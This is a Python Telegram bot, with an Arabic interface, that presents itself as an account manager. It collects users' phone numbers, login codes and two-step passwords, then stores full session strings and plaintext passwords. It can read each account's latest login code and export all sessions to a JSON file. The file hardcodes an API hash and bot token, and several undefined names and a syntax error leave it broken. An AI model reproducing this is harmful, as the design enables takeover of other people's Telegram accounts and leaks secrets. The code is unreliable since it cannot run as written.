import os
import json
import shutil
from telethon import TelegramClient, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError, ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl import functions

API_ID = "21669021"
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
BOT_TOKEN = "7464446606:AAFb6FK5oAwLEiuDCftx2cA2jfSBPsyJjj8"

client = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

db = {"accounts": []}  # Temporary in-memory database

# Helper function to build main menu buttons
def build_main_buttons(accounts_count):
    return [
        [Button.inline("➕ إضافة حساب", data="add_account")],
        [Button.inline("📲 جلب آخر كود", data="get_code")],
        [Button.inline(f"ℹ️ معلومات الحسابات ({accounts_count})", data="account_info")],
        [Button.inline("📦 النسخ الاحتياطي", data="backup")],
        [Button.inline("📤 استعادة النسخة الاحتياطية", data="restore")],
    ]

# Main function
@client.on(events.NewMessage(pattern="/start"))
async def start(event):
    accounts = db.get("accounts", [])
    await event.respond("🔐 مرحبًا بك في مدير حسابات تيليجرام. يمكنك إدارة حساباتك بسهولة من هنا.", buttons=build_main_buttons(len(accounts)))

# Add new account
@client.on(events.CallbackQuery(data="add_account"))
async def add_account(event):
    async with client.conversation(event.chat_id) as conv:
        await conv.send_message("📱 من فضلك أرسل رقم الهاتف:")
        phone_response = await conv.get_response()
        phone_number = phone_response.text.strip()

        app = TelegramClient(StringSession(), API_ID, API_HASH)
        await app.connect()

        try:
            await app.send_code_request(phone_number)
            await conv.send_message("📩 تم إرسال كود التفعيل. من فضلك أرسل الكود:")
            code_response = await conv.get_response()
            code = code_response.text.strip()

            await app.sign_in(phone_number, code)

            # تحقق إذا كان الحساب يحتوي على التحقق بخطوتين
            try:
                string_session = app.session.save()
                data = {"phone_number": phone_number, "two-step": "لا يوجد", "session": string_session}
                accounts.append(data)
                db.set("accounts", accounts)
                await conv.send_message(f"✅ تم حفظ الحساب بنجاح!", buttons=build_main_buttons(len(accounts)))

            except SessionPasswordNeededError:
                await conv.send_message("🔑 الحساب يحتوي على تحقق بخطوتين. من فضلك أرسل كلمة المرور الخاصة بالتحقق بخطوتين:")
                password_response = await conv.get_response()
                password = password_response.text.strip()

                try:
                    await app.sign_in(password=password)
                    string_session = app.session.save()
                    data = {"phone_number": phone_number, "two-step": password, "session": string_session}
                    accounts.append(data)
                    db.set("accounts", accounts)
                    await conv.send_message(f"✅ تم حفظ الحساب بنجاح!", buttons=build_main_buttons(len(accounts)))
                except PasswordHashInvalidError:
                    await conv.send_message("🚫 كلمة المرور غير صحيحة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])

        except (ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError, PhoneCodeExpiredError):
            await conv.send_message("🚫 حدث خطأ في إدخال البيانات. تأكد من الرقم والكود المدخل.", buttons=[[Button.inline("🔙 رجوع", data="back")]])

        finally:
            await app.disconnect()

# وظيفة جلب الكود
async def get_code(event):
    accounts = db.get("accounts")
    if not accounts:
        await event.edit("🚫 لا توجد حسابات مضافة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
        return

    buttons = []
    for account in accounts:
        buttons.append([Button.inline(f"📱 {account['phone_number']}", data=f"get_code_{account['phone_number']}")])

    buttons.append([Button.inline("🔙 رجوع", data="back")])
    await event.edit("اختر الحساب لجلب آخر كود:", buttons=buttons)

# وظيفة استخراج آخر كود لحساب معين
async def fetch_code(event, phone_number):
    accounts = db.get("accounts")
    account = next((acc for acc in accounts if acc['phone_number'] == phone_number), None)

    if not account:
        await event.edit("🚫 الحساب غير موجود.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
        return

    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
    await app.connect()

    try:
        async for message in app.iter_messages(777000, limit=1):
            if message.text:
                # استخراج فقط الكود من الرسالة
                code = ''.join(filter(str.isdigit, message.text))
                await event.edit(f"📩 آخر كود للحساب {phone_number}: (`{code}`)\n\n(يمكنك نسخه)", parse_mode="md", buttons=[[Button.inline("🔙 رجوع", data="back")]])
            else:
                await event.edit(f"⚠️ لم يتم العثور على كود للحساب {phone_number}.", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    finally:
        await app.disconnect()

# وظيفة النسخ الاحتياطي
async def backup_data(event):
    backup_file = 'backup/backup_data.json'
    
    if not os.path.isdir('backup'):
        os.mkdir('backup')
    
    data = {
        "accounts": db.get("accounts")
    }

    with open(backup_file, 'w') as f:
        json.dump(data, f)

    await bot.send_file(event.chat_id, backup_file, caption="📦 النسخة الاحتياطية تم إنشاؤها بنجاح.")
    shutil.rmtree('backup')

# وظيفة استعادة النسخة الاحتياطية
async def restore_data(event):
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📤 من فضلك أرسل ملف النسخة الاحتياطية:")
        response = await conv.get_response()
        
        if not response.file or not response.file.name.endswith('.json'):
            await conv.send_message("🚫 الملف غير صحيح، يرجى إرسال ملف JSON.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
            return
        
        backup_file = 'backup/restore_data.json'
        
        if not os.path.isdir('backup'):
            os.mkdir('backup')

        await bot.download_media(response, backup_file)

        with open(backup_file, 'r') as f:
            data = json.load(f)

        db.set("accounts", data.get("accounts", []))

        await conv.send_message("✅ تم استعادة البيانات بنجاح.", buttons=build_main_buttons(len(data.get("accounts", []))))
        shutil.rmtree('backup')

# وظيفة اختيار الحساب لجلب معلومات الحساب
async def choose_account_to_get_info(event):
    accounts = db.get("accounts")
    if not accounts:
        await event.edit("🚫 لا توجد حسابات مضافة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
        return

    buttons = []
    for account in accounts:
        buttons.append([Button.inline(f"📱 {account['phone_number']}", data=f"info_{account['phone_number']}")])

    buttons.append([Button.inline("🔙 رجوع", data="back")])
    await event.edit("اختر الحساب لجلب المعلومات:", buttons=buttons)

# وظيفة جلب معلومات الحساب
async def get_account_info(event, phone_number):
    accounts = db.get("accounts")
    account = next((acc for acc in accounts if acc['phone_number'] == phone_number), None)

    if not account:
        await event.edit("🚫 الحساب غير موجود.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
        return

    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
    await app.connect()

    try:
        await event.edit(f"⏳ جاري جلب معلومات الحساب {phone_number}...")

        me = await app.get_me()
        devices = await app(functions.account.GetAuthorizationsRequest())
        dialogs = await app.get_dialogs()
        unread_count = sum(1 for dialog in dialogs if dialog.unread_count > 0)
        blocked_users = await app(functions.contacts.GetBlockedRequest(offset=0, limit=100))

        two_step = account.get("two-step", "لا يوجد")

        await event.edit(f"ℹ️ معلومات الحساب {phone_number}:\n"
                         f"👤 عدد الأجهزة المسجلة: {len(devices.authorizations)}\n"
                         f"💬 عدد المحادثات: {len(dialogs)}\n"
                         f"📨 عدد المحادثات غير المقروءة: {unread_count}\n"
                         f"🚫 عدد المحظورين: {len(blocked_users.blocked)}\n"
                         f"🔑 كلمة مرور التحقق بخطوتين: `{two_step}`\n\n"
                         "(يمكنك نسخ كلمة المرور إذا كانت موجودة)",
                         parse_mode="md", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    except Exception as e:
        await event.edit(f"❌ حدث خطأ أثناء جلب معلومات الحساب: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    finally:
        awaitapp.disconnect()

# العودة إلى القائمة الرئيسية
@client.on(events.CallbackQuery(data="back"))
async def back_to_menu(event):
    accounts = db.get("accounts", [])
    await event.edit("🔙 العودة إلى القائمة الرئيسية", buttons=build_main_buttons(len(accounts)))

# تسجيل حساب لاستخراج كود التفعيل
@client.on(events.CallbackQuery(pattern=r"get_code_(.+)"))
async def on_get_code(event):
    phone_number = event.data.decode('utf-8').split("_")[2]
    await fetch_code(event, phone_number)

# جلب معلومات الحساب
@client.on(events.CallbackQuery(pattern=r"info_(.+)"))
async def on_account_info(event):
    phone_number = event.data.decode('utf-8').split("_")[1]
    await get_account_info(event, phone_number)

# جلب آخر كود
@client.on(events.CallbackQuery(data="get_code"))
async def on_get_code(event):
    await get_code(event)

# النسخ الاحتياطي
@client.on(events.CallbackQuery(data="backup"))
async def on_backup(event):
    await backup_data(event)

# استعادة النسخة الاحتياطية
@client.on(events.CallbackQuery(data="restore"))
async def on_restore(event):
    await restore_data(event)

# جلب معلومات الحسابات
@client.on(events.CallbackQuery(data="account_info"))
async def on_account_info(event):
    await choose_account_to_get_info(event)

# تشغيل البوت
client.start()
client.run_until_disconnected()
